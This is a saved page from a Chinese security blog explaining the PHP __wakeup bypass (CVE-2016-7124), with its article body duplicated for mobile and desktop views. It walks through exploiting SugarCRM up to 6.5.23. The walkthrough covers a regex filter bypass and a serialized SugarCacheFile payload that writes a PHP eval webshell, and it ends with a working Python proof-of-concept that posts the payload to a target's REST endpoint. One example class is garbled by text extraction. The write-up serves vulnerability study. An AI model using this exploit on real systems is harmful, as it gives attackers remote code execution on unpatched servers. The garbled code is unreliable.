<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/font-awesome.min.css" rel="stylesheet"/>
<link href="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/screen.css" rel="stylesheet"/>
<link href="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/prism_okaidia.css" rel="stylesheet"/>
<link href="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/bendawang.css" rel="stylesheet"/>
<script src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="__wakeupcve20167124">__wakeup()函数失效引发漏洞(CVE-2016-7124)</h1>
<p style="max-width:100%;height:auto;">之前在hitcon 2016了解到这个漏洞，后来因为保研、项目什么的一直没时间做，终于有时间研究下这个漏洞了。
ven师傅Blog：http://www.venenof.com/index.php/archives/167/</p>
<h2 id="">漏洞影响版本</h2>
<p style="max-width:100%;height:auto;">PHP5 &lt; 5.6.25
PHP7 &lt; 7.0.10</p>
<h2 id="-1">漏洞原理</h2>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">__wakeup</code>触发于<code style="max-width:100%;height:auto;">unserilize()</code>调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得<code style="max-width:100%;height:auto;">__wakeup</code>失效。</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
class bendawang{
    private $a = array();
    function __wakeup()
    {
        echo "hello\n";
    }
    function __destruct(){
        echo "123";
    }
}
/*111
$b=new bendawang();
echo serialize($b);
file_put_contents(&amp;apos;1.txt&amp;apos;, serialize($b));
*/
/*222
$c = unserialize(file_get_contents(&amp;apos;1.txt&amp;apos;));
var_dump($c);
*/
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">先运行第一部分，然后得到
把<code style="max-width:100%;height:auto;">1.txt</code>里面的<code style="max-width:100%;height:auto;">"bendawang":1</code>改成2，那么就无法触发<code style="max-width:100%;height:auto;">__wakeup()</code>，但是随后会继续触发<code style="max-width:100%;height:auto;">__destruct</code></p>
<h2 id="-2">漏洞场景</h2>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
class Student{  
    private $full_name = &amp;apos;&amp;apos;;
    private $score = 0;
    private $grades = array();

    public function __construct(fullname,fullname,
score, $grades)

    {
        this−&gt;fullname=this−&gt;fullname=
full_name;

        this−&gt;grades=this−&gt;grades=
grades;

        this−&gt;score=this−&gt;score=
score;

    }

    function __destruct()
    {
        var_dump($this);
    }

    function __wakeup()
    {
        foreach(get_object_vars(this)asthis)as
k =&gt; $v) {

            this−&gt;this−&gt;
k = null;

        }
        echo "Waking up...\n";
    }
}

// $s = new Student(&amp;apos;bendawang&amp;apos;, 123, array(&amp;apos;a&amp;apos; =&gt; 90, &amp;apos;b&amp;apos; =&gt; 100));
// file_put_contents(&amp;apos;1.txt&amp;apos;, serialize($s));
$a = unserialize(file_get_contents(&amp;apos;1.txt&amp;apos;));
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">正常运行应当是<code style="max-width:100%;height:auto;">$a</code>的属性因为执行了<code style="max-width:100%;height:auto;">__wakeup</code>都被清空了
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105133570" style="max-width:100%;height:auto;"/><br/>
而此时我们把<code style="max-width:100%;height:auto;">1.txt</code>里面的
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105232523" style="max-width:100%;height:auto;"/><br/>
换成如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105159456" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">再执行
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105252333" style="max-width:100%;height:auto;"/><br/>
发现并没有在执行<code style="max-width:100%;height:auto;">__wakeup</code>函数，所以这就是问题所在了！！</p>
<h2 id="-3">实例演示</h2>
<blockquote>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">sugarcrm &lt;=6.5.23</code>
  首先是在<code style="max-width:100%;height:auto;">service/core/REST/SugarRestSerialize.php</code>下的serve.php函数如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105319898" style="max-width:100%;height:auto;"/><br/>
  观察到其中传入<code style="max-width:100%;height:auto;">sugar_unserialize</code>的<code style="max-width:100%;height:auto;">$data</code>是我们可以控制的，来自于<code style="max-width:100%;height:auto;">$_REQUEST[&amp;apos;rest_data&amp;apos;]</code>。
  其中<code style="max-width:100%;height:auto;">sugar_unserialize</code>函数定义如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105339524" style="max-width:100%;height:auto;"/><br/></p>
</blockquote>
<p style="max-width:100%;height:auto;">而这里<code style="max-width:100%;height:auto;">&amp;apos;/[oc]:\d+:/i&amp;apos;</code>我们是可以绕过的，它本意是想过滤掉输入的object类型，但是如果我们是这样子的呢<code style="max-width:100%;height:auto;">o:14 -&gt; o:+14</code>，这样就完成绕过。
从而能够是我们的数据成功传入到<code style="max-width:100%;height:auto;">unserialize</code>中。
接下来就是寻找另一个类，并且含有可利用的魔法方法
于是我们找到了<code style="max-width:100%;height:auto;">include/SugarCache/SugarCacheFile.php</code>下的两个魔法方法。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105355992" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">也就是说，接下来我们就需要找到一个点，这个点调用了<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>的<code style="max-width:100%;height:auto;">serve()</code>方法，并且这个点<code style="max-width:100%;height:auto;">include</code>过存在漏洞的<code style="max-width:100%;height:auto;">SugarCacheFile.php</code>文件。
在<code style="max-width:100%;height:auto;">/sugarcrm/service/v4/rest.php</code>中如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105416288" style="max-width:100%;height:auto;"/><br/>
而其中的<code style="max-width:100%;height:auto;">webservice.php</code>为：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
ob_start();
chdir(dirname(__FILE__).&amp;apos;/../../&amp;apos;);
require(&amp;apos;include/entryPoint.php&amp;apos;);
require_once(&amp;apos;soap/SoapError.php&amp;apos;);
require_once(&amp;apos;SoapHelperWebService.php&amp;apos;);
require_once(&amp;apos;SugarRestUtils.php&amp;apos;);
require_once($webservice_path);   //  service/core/SugarRestService.php
require_once($registry_path);     //  service/v4/registry.php
if(isset($webservice_impl_class_path))
    require_once($webservice_impl_class_path);
$url = $GLOBALS[&amp;apos;sugar_config&amp;apos;][&amp;apos;site_url&amp;apos;].$location;
$service = new $webservice_class($url);
$service-&gt;registerClass($registry_class);
$service-&gt;register();
$service-&gt;registerImplClass($webservice_impl_class);
// set the service object in the global scope so that any error, if happens, can be set on this object
global $service_object;
$service_object = $service;
$service-&gt;serve();
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">这里相当于在<code style="max-width:100%;height:auto;">webservice.php</code>中实例化了<code style="max-width:100%;height:auto;">service/core/SugarRestService.php</code>中的<code style="max-width:100%;height:auto;">SugarRestService</code>类并且调用了这个类的<code style="max-width:100%;height:auto;">serve</code>方法，看看这个被实例化的类的构造方法和<code style="max-width:100%;height:auto;">serve()</code></p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">protected function _getTypeName($name)
{
   if(empty($name)) return &amp;apos;SugarRest&amp;apos;;
   $name = clean_string($name, &amp;apos;ALPHANUM&amp;apos;);
   $type = &amp;apos;&amp;apos;;
   switch(strtolower($name)) {
      case &amp;apos;json&amp;apos;:
         $type = &amp;apos;JSON&amp;apos;;
         break;
      case &amp;apos;rss&amp;apos;:
         $type = &amp;apos;RSS&amp;apos;;
         break;
      case &amp;apos;serialize&amp;apos;:
         $type = &amp;apos;Serialize&amp;apos;;
         break;
   }
   $classname = "SugarRest$type";
   if(!file_exists(&amp;apos;service/core/REST/&amp;apos; . $classname . &amp;apos;.php&amp;apos;)) {
      return &amp;apos;SugarRest&amp;apos;;
   }
   return $classname;
}
/**
 * Constructor.
 *
 * @param String $url - REST url
 */
function __construct($url){
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;Begin: SugarRestService-&gt;__construct&amp;apos;);
   $this-&gt;restURL = $url;
   $this-&gt;responseClass = $this-&gt;_getTypeName(@$_REQUEST[&amp;apos;response_type&amp;apos;]);
   $this-&gt;serverClass = $this-&gt;_getTypeName(@$_REQUEST[&amp;apos;input_type&amp;apos;]);
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;SugarRestService-&gt;__construct serverclass = &amp;apos; . $this-&gt;serverClass);
   require_once(&amp;apos;service/core/REST/&amp;apos;. $this-&gt;serverClass . &amp;apos;.php&amp;apos;);
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;End: SugarRestService-&gt;__construct&amp;apos;);
}

function serve(){
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;Begin: SugarRestService-&gt;serve&amp;apos;);
   require_once(&amp;apos;service/core/REST/&amp;apos;. $this-&gt;responseClass . &amp;apos;.php&amp;apos;);
   $response  = $this-&gt;responseClass;
   $responseServer = new $response($this-&gt;implementation);
   $this-&gt;server-&gt;faultServer = $responseServer;
   $responseServer-&gt;faultServer = $responseServer;
   $responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;End: SugarRestService-&gt;serve&amp;apos;);
}
</code></pre>
<p style="max-width:100%;height:auto;">所以当我们传入<code style="max-width:100%;height:auto;">input_type</code>是<code style="max-width:100%;height:auto;">serialize</code>的时候，就能够将我们希望的<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>文件包含进来，并且在运行上面的serve的时候把我们希望的<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>下的<code style="max-width:100%;height:auto;">serve</code>也调用了，完美符合要求。
先构造出我们的payload，如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
class SugarCacheFile{
    protected $_cacheFileName;
    protected $_localStore ;
    protected $_cacheChanged = true;
    function __construct($a,$b){
        $this-&gt;_cacheFileName=$a;
        $this-&gt;_localStore[0]=$b;
    }
}
$a="../custom/1.php";

$b="&lt;?php eval(\$_POST[&amp;apos;bdw&amp;apos;]);?&gt;";
$sugarcachefile=new SugarCacheFile($a,$b);
echo serialize($sugarcachefile)."&lt;br&gt;";
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">得到的如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105447289" style="max-width:100%;height:auto;"/><br/>
然后把最开始的14改为+14，把3改为其他大于3的数字，这样子就能够绕过过滤和判断，从而把一句话写入到<code style="max-width:100%;height:auto;">$_cacheFileName</code>中，即<code style="max-width:100%;height:auto;">custom/1.php</code>。</p>
<blockquote>
<p style="max-width:100%;height:auto;">这里需要注意一个很重要的地方，一定要把里面的代表类型的小写s变成大写S，不然会失败。
  最终提交如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105519352" style="max-width:100%;height:auto;"/><br/>
  这样子就成功了。
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105533899" style="max-width:100%;height:auto;"/><br/>
  写一个poc</p>
</blockquote>
<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python
# encoding: utf-8

import requests
import sys

if len(sys.argv)&lt;=1:
    print "usage : python xxx.py sitehome"

else:
    ip=sys.argv[1]
    url=ip+"/sugarcrm/service/v4/rest.php"
    param={
        &amp;apos;method&amp;apos;: &amp;apos;login&amp;apos;,
        "input_type":"Serialize",
        "rest_data":&amp;apos;O:+14:"SugarCacheFile":10:{S:17:"\\00*\\00_cacheFileName";S:15:"../custom/1.php";S:14:"\\00*\\00_localStore";a:1:{i:0;S:28:"&lt;?php eval($_POST[\&amp;apos;bdw\&amp;apos;]);?&gt;";}S:16:"\\00*\\00_cacheChanged";b:1;}&amp;apos;
    }
    r=requests.session()
    result=r.post(url,data=param)
    print result.content
</code></pre>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="__wakeupcve20167124">__wakeup()函数失效引发漏洞(CVE-2016-7124)</h1>
<p style="max-width:100%;height:auto;">之前在hitcon 2016了解到这个漏洞，后来因为保研、项目什么的一直没时间做，终于有时间研究下这个漏洞了。
ven师傅Blog：http://www.venenof.com/index.php/archives/167/</p>
<h2 id="">漏洞影响版本</h2>
<p style="max-width:100%;height:auto;">PHP5 &lt; 5.6.25
PHP7 &lt; 7.0.10</p>
<h2 id="-1">漏洞原理</h2>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">__wakeup</code>触发于<code style="max-width:100%;height:auto;">unserilize()</code>调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得<code style="max-width:100%;height:auto;">__wakeup</code>失效。</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
class bendawang{
    private $a = array();
    function __wakeup()
    {
        echo "hello\n";
    }
    function __destruct(){
        echo "123";
    }
}
/*111
$b=new bendawang();
echo serialize($b);
file_put_contents(&amp;apos;1.txt&amp;apos;, serialize($b));
*/
/*222
$c = unserialize(file_get_contents(&amp;apos;1.txt&amp;apos;));
var_dump($c);
*/
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">先运行第一部分，然后得到
把<code style="max-width:100%;height:auto;">1.txt</code>里面的<code style="max-width:100%;height:auto;">"bendawang":1</code>改成2，那么就无法触发<code style="max-width:100%;height:auto;">__wakeup()</code>，但是随后会继续触发<code style="max-width:100%;height:auto;">__destruct</code></p>
<h2 id="-2">漏洞场景</h2>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
class Student{  
    private $full_name = &amp;apos;&amp;apos;;
    private $score = 0;
    private $grades = array();

    public function __construct(fullname,fullname,
score, $grades)

    {
        this−&gt;fullname=this−&gt;fullname=
full_name;

        this−&gt;grades=this−&gt;grades=
grades;

        this−&gt;score=this−&gt;score=
score;

    }

    function __destruct()
    {
        var_dump($this);
    }

    function __wakeup()
    {
        foreach(get_object_vars(this)asthis)as
k =&gt; $v) {

            this−&gt;this−&gt;
k = null;

        }
        echo "Waking up...\n";
    }
}

// $s = new Student(&amp;apos;bendawang&amp;apos;, 123, array(&amp;apos;a&amp;apos; =&gt; 90, &amp;apos;b&amp;apos; =&gt; 100));
// file_put_contents(&amp;apos;1.txt&amp;apos;, serialize($s));
$a = unserialize(file_get_contents(&amp;apos;1.txt&amp;apos;));
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">正常运行应当是<code style="max-width:100%;height:auto;">$a</code>的属性因为执行了<code style="max-width:100%;height:auto;">__wakeup</code>都被清空了
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105133570" style="max-width:100%;height:auto;"/><br/>
而此时我们把<code style="max-width:100%;height:auto;">1.txt</code>里面的
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105232523" style="max-width:100%;height:auto;"/><br/>
换成如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105159456" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">再执行
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105252333" style="max-width:100%;height:auto;"/><br/>
发现并没有在执行<code style="max-width:100%;height:auto;">__wakeup</code>函数，所以这就是问题所在了！！</p>
<h2 id="-3">实例演示</h2>
<blockquote>
<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">sugarcrm &lt;=6.5.23</code>
  首先是在<code style="max-width:100%;height:auto;">service/core/REST/SugarRestSerialize.php</code>下的serve.php函数如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105319898" style="max-width:100%;height:auto;"/><br/>
  观察到其中传入<code style="max-width:100%;height:auto;">sugar_unserialize</code>的<code style="max-width:100%;height:auto;">$data</code>是我们可以控制的，来自于<code style="max-width:100%;height:auto;">$_REQUEST[&amp;apos;rest_data&amp;apos;]</code>。
  其中<code style="max-width:100%;height:auto;">sugar_unserialize</code>函数定义如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105339524" style="max-width:100%;height:auto;"/><br/></p>
</blockquote>
<p style="max-width:100%;height:auto;">而这里<code style="max-width:100%;height:auto;">&amp;apos;/[oc]:\d+:/i&amp;apos;</code>我们是可以绕过的，它本意是想过滤掉输入的object类型，但是如果我们是这样子的呢<code style="max-width:100%;height:auto;">o:14 -&gt; o:+14</code>，这样就完成绕过。
从而能够是我们的数据成功传入到<code style="max-width:100%;height:auto;">unserialize</code>中。
接下来就是寻找另一个类，并且含有可利用的魔法方法
于是我们找到了<code style="max-width:100%;height:auto;">include/SugarCache/SugarCacheFile.php</code>下的两个魔法方法。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105355992" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">也就是说，接下来我们就需要找到一个点，这个点调用了<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>的<code style="max-width:100%;height:auto;">serve()</code>方法，并且这个点<code style="max-width:100%;height:auto;">include</code>过存在漏洞的<code style="max-width:100%;height:auto;">SugarCacheFile.php</code>文件。
在<code style="max-width:100%;height:auto;">/sugarcrm/service/v4/rest.php</code>中如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105416288" style="max-width:100%;height:auto;"/><br/>
而其中的<code style="max-width:100%;height:auto;">webservice.php</code>为：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
ob_start();
chdir(dirname(__FILE__).&amp;apos;/../../&amp;apos;);
require(&amp;apos;include/entryPoint.php&amp;apos;);
require_once(&amp;apos;soap/SoapError.php&amp;apos;);
require_once(&amp;apos;SoapHelperWebService.php&amp;apos;);
require_once(&amp;apos;SugarRestUtils.php&amp;apos;);
require_once($webservice_path);   //  service/core/SugarRestService.php
require_once($registry_path);     //  service/v4/registry.php
if(isset($webservice_impl_class_path))
    require_once($webservice_impl_class_path);
$url = $GLOBALS[&amp;apos;sugar_config&amp;apos;][&amp;apos;site_url&amp;apos;].$location;
$service = new $webservice_class($url);
$service-&gt;registerClass($registry_class);
$service-&gt;register();
$service-&gt;registerImplClass($webservice_impl_class);
// set the service object in the global scope so that any error, if happens, can be set on this object
global $service_object;
$service_object = $service;
$service-&gt;serve();
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">这里相当于在<code style="max-width:100%;height:auto;">webservice.php</code>中实例化了<code style="max-width:100%;height:auto;">service/core/SugarRestService.php</code>中的<code style="max-width:100%;height:auto;">SugarRestService</code>类并且调用了这个类的<code style="max-width:100%;height:auto;">serve</code>方法，看看这个被实例化的类的构造方法和<code style="max-width:100%;height:auto;">serve()</code></p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">protected function _getTypeName($name)
{
   if(empty($name)) return &amp;apos;SugarRest&amp;apos;;
   $name = clean_string($name, &amp;apos;ALPHANUM&amp;apos;);
   $type = &amp;apos;&amp;apos;;
   switch(strtolower($name)) {
      case &amp;apos;json&amp;apos;:
         $type = &amp;apos;JSON&amp;apos;;
         break;
      case &amp;apos;rss&amp;apos;:
         $type = &amp;apos;RSS&amp;apos;;
         break;
      case &amp;apos;serialize&amp;apos;:
         $type = &amp;apos;Serialize&amp;apos;;
         break;
   }
   $classname = "SugarRest$type";
   if(!file_exists(&amp;apos;service/core/REST/&amp;apos; . $classname . &amp;apos;.php&amp;apos;)) {
      return &amp;apos;SugarRest&amp;apos;;
   }
   return $classname;
}
/**
 * Constructor.
 *
 * @param String $url - REST url
 */
function __construct($url){
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;Begin: SugarRestService-&gt;__construct&amp;apos;);
   $this-&gt;restURL = $url;
   $this-&gt;responseClass = $this-&gt;_getTypeName(@$_REQUEST[&amp;apos;response_type&amp;apos;]);
   $this-&gt;serverClass = $this-&gt;_getTypeName(@$_REQUEST[&amp;apos;input_type&amp;apos;]);
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;SugarRestService-&gt;__construct serverclass = &amp;apos; . $this-&gt;serverClass);
   require_once(&amp;apos;service/core/REST/&amp;apos;. $this-&gt;serverClass . &amp;apos;.php&amp;apos;);
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;End: SugarRestService-&gt;__construct&amp;apos;);
}

function serve(){
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;Begin: SugarRestService-&gt;serve&amp;apos;);
   require_once(&amp;apos;service/core/REST/&amp;apos;. $this-&gt;responseClass . &amp;apos;.php&amp;apos;);
   $response  = $this-&gt;responseClass;
   $responseServer = new $response($this-&gt;implementation);
   $this-&gt;server-&gt;faultServer = $responseServer;
   $responseServer-&gt;faultServer = $responseServer;
   $responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());
   $GLOBALS[&amp;apos;log&amp;apos;]-&gt;info(&amp;apos;End: SugarRestService-&gt;serve&amp;apos;);
}
</code></pre>
<p style="max-width:100%;height:auto;">所以当我们传入<code style="max-width:100%;height:auto;">input_type</code>是<code style="max-width:100%;height:auto;">serialize</code>的时候，就能够将我们希望的<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>文件包含进来，并且在运行上面的serve的时候把我们希望的<code style="max-width:100%;height:auto;">SugarRestSerialize.php</code>下的<code style="max-width:100%;height:auto;">serve</code>也调用了，完美符合要求。
先构造出我们的payload，如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
class SugarCacheFile{
    protected $_cacheFileName;
    protected $_localStore ;
    protected $_cacheChanged = true;
    function __construct($a,$b){
        $this-&gt;_cacheFileName=$a;
        $this-&gt;_localStore[0]=$b;
    }
}
$a="../custom/1.php";

$b="&lt;?php eval(\$_POST[&amp;apos;bdw&amp;apos;]);?&gt;";
$sugarcachefile=new SugarCacheFile($a,$b);
echo serialize($sugarcachefile)."&lt;br&gt;";
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">得到的如下：
<br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105447289" style="max-width:100%;height:auto;"/><br/>
然后把最开始的14改为+14，把3改为其他大于3的数字，这样子就能够绕过过滤和判断，从而把一句话写入到<code style="max-width:100%;height:auto;">$_cacheFileName</code>中，即<code style="max-width:100%;height:auto;">custom/1.php</code>。</p>
<blockquote>
<p style="max-width:100%;height:auto;">这里需要注意一个很重要的地方，一定要把里面的代表类型的小写s变成大写S，不然会失败。
  最终提交如下：
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105519352" style="max-width:100%;height:auto;"/><br/>
  这样子就成功了。
  <br/><img alt="这里写图片描述" data-action="zoom" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/20161022105533899" style="max-width:100%;height:auto;"/><br/>
  写一个poc</p>
</blockquote>
<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python
# encoding: utf-8

import requests
import sys

if len(sys.argv)&lt;=1:
    print "usage : python xxx.py sitehome"

else:
    ip=sys.argv[1]
    url=ip+"/sugarcrm/service/v4/rest.php"
    param={
        &amp;apos;method&amp;apos;: &amp;apos;login&amp;apos;,
        "input_type":"Serialize",
        "rest_data":&amp;apos;O:+14:"SugarCacheFile":10:{S:17:"\\00*\\00_cacheFileName";S:15:"../custom/1.php";S:14:"\\00*\\00_localStore";a:1:{i:0;S:28:"&lt;?php eval($_POST[\&amp;apos;bdw\&amp;apos;]);?&gt;";}S:16:"\\00*\\00_cacheChanged";b:1;}&amp;apos;
    }
    r=requests.session()
    result=r.post(url,data=param)
    print result.content
</code></pre>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./__wakeup()函数失效引发漏洞(CVE-2016-7124)/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
